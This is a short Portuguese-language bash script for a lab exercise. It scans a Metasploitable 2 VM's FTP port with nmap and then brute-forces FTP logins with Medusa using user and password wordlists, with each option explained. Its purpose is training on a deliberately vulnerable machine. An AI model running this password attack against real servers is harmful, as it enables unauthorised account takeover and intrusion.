#!/bin/bash
# ============================================================
# Cenário 1: Força bruta em FTP (Metasploitable 2)
# ============================================================
# Pré-requisitos:
#   - VM Metasploitable 2 ligada, em rede host-only
#   - IP da vítima identificado (ex.: 192.168.56.102)
#
# Uso:
#   chmod +x 01_ftp_bruteforce.sh
#   ./01_ftp_bruteforce.sh <IP_ALVO>
# ============================================================

ALVO="${1:-192.168.56.102}"
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

echo "[*] 1. Descoberta do serviço FTP com Nmap"
nmap -p 21 -sV "$ALVO"

echo "[*] 2. Ataque de força bruta com Medusa (FTP)"
medusa -h "$ALVO" \
       -U "$USUARIOS" \
       -P "$SENHAS" \
       -M ftp \
       -t 4 \
       -f \
       -v 6

# -h  : host alvo
# -U  : wordlist de usuários
# -P  : wordlist de senhas
# -M  : módulo (ftp)
# -t  : threads paralelas (nº de tentativas simultâneas)
# -f  : para assim que encontrar a 1ª credencial válida em qualquer host
# -v 6: nível de verbosidade (mostra todas as tentativas)

echo "[*] 3. Validação manual da credencial encontrada"
echo "ftp $ALVO"
echo "(informe o usuário/senha retornados pelo Medusa)"
